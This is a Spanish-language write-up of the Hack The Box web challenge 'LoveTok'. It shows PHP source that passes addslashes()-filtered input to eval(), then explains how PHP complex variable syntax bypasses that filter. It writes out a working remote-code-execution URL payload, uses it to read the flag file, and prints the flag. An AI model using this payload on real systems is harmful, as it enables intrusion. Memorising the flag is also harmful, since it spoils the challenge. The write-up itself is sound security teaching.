---
title: LoveTok HTB
date: 2023-04-25
type: challenge
author: naibu3
---

#web #sanitization_bypass #php #addslashes_bypass #rce 

# LoveTok HTB

Es uno de los challenges de la sección de *web*.

## Reconocimiento

Al acceder a la dirección que nos proporcionan vemos una página bastante simple, que nos muestra una cuenta atrás y un botón para reiniciarla. Si revisamos [[wappalizer]], podremos ver que se está haciendo uso de la librería *moment.js*. Otra cosa que salta a la vista es que por url estamos pasando un parámetro `format=r`:

```url
http://161.35.36.167:32629/?format=r
```

Como no hay mucho más que hacer en la propia página pasamos a analizar los archivos del servidor. Encontramos un archivo `controllers/TimeController.php` en el que podemos ver que se asigna el valor de `format` a una variable `format`:

```php
<?php
 class TimeController
{
	public function index($router)
	{
		$format = isset($_GET['format']) ? $_GET['format'] : 'r';
		$time = new TimeModel($format);
		return $router->view('index', ['time' => $time->getTime()]);
	}
}
```

Además en otro archivo `models/TimeModel.php`, podemos ver que se aplica una sanitización con `addslashes()` a dicha variable `format`, para después utilizarla en una llamada a `eval()`:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Podemos pensar que tenemos [[RCE]] simplemente con una inyección tal que así:

```php
eval('$time = date(" ") system("command") //", strtotime("'...
```

Sin embargo, `addslashes()` está añadiendo `\` para escapar `'`, `"`,`\` y el bit nulo. Por tanto, debemos utilizar otra característica de *php*, las *complex variables* (*variables complejas*). Esta característica consiste en acceder a un valor mediante `${valor}`, lo cuál no sólo evaluará el valor de las variables que contiene (igual que las comillas dobles `"`), sino que también evaluará el valor de retorno de las funciones.

El payload nos queda por ahora: `${system("comando")}`. Sin embargo, las comillas del argumento de `system()` también se escaparán, por lo que debemos *bypassearlas*. Una forma sería que leyeramos dicho argumento como un argumento de la propia url con `$_GET[i]`. La url con el *payload* quedaría:

```url
http://161.35.36.167:32629/?format=${system($_GET[1])}&1=command
```

Así ya podemos ejecutar comandos. Si revisamos la raíz con `ls`, veremos un archivo `flagxxxxx` (los últimos dígitos cambian aleatoriamente cada vez que reiniciamos la instancia). Si lo listamos con `cat`, obtendremos la flag (`HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}`).
